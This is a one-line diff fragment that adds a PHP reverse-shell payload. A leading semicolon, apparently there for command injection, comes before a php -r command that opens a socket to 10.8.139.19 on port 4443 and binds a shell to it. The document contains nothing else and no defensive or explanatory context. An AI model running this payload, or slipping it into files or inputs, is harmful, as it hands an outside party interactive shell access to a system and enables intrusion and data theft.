@@ -1,0 +1,1 @@
+;php -r '$sock=fsockopen("10.8.139.19",4443);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
